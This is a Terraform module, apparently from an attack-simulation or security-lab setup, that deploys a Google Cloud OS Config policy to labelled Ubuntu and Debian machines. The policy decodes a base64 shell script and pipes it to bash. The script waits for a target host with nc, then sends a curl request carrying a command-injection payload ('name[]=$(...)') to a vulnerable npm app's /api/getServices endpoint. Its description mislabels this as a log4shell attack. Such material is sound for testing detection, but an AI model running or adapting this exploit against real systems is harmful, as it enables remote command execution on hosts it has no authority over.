locals {
    target_ip=var.target_ip
    target_port=var.target_port
    payload = <<-EOT
    LOGFILE=/tmp/osconfig_attacker_exec_vuln_npm_app_attacker.log
    function log {
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
        echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
    }
    truncate -s 0 $LOGFILE
    log "payload: curl --get --verbose \"http://${local.target_ip}:${local.target_port}/api/getServices\" --data-urlencode 'name[]=\$(${var.payload})'"
    log "checking target: ${local.target_ip}:${local.target_port}"
    while ! nc -z -w 5 -vv ${local.target_ip} ${local.target_port} > /dev/null; do
        log "failed check - waiting for target";
        sleep 30;
    done;
    log "target available - sending payload";
    sleep 5;
    curl --get --verbose "http://${local.target_ip}:${local.target_port}/api/getServices" --data-urlencode 'name[]=$(${var.payload})' >> $LOGFILE 2>&1;
    echo "\n" >> $LOGFILE
    log "payload sent sleeping..."
    log "done";
    EOT
    base64_payload = base64encode(local.payload)
}

data "google_compute_zones" "available" {
  project     = var.gcp_project_id
  region    = var.gcp_location
}

resource "google_os_config_os_policy_assignment" "osconfig-exec-vuln-npm-app-attacker" {

  project     = var.gcp_project_id
  location    = data.google_compute_zones.available.names[0]
  
  name        = "osconfig-exec-vuln-npm-app-attacker-${var.environment}-${var.deployment}"
  description = "Execute docker log4shell attack"
  skip_await_rollout = true
  
  instance_filter {
    all = false

    inclusion_labels {
      labels = var.label
    }

    inventories {
      os_short_name = "ubuntu"
    }

    inventories {
      os_short_name = "debian"
    }

  }

  os_policies {
    id   = "osconfig-exec-vuln-npm-app-attacker-${var.environment}-${var.deployment}"
    mode = "ENFORCEMENT"

    resource_groups {
      resources {
        id = "run"
        exec {
          validate {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
          }
          enforce {
            interpreter      = "SHELL"
            output_file_path = "$HOME/os-policy-tf.out"
            script           = "exit 100"
          }
        }
      }
    }
  }

  rollout {
    disruption_budget {
      percent = 100
    }
    min_wait_duration = "600s"
  }
}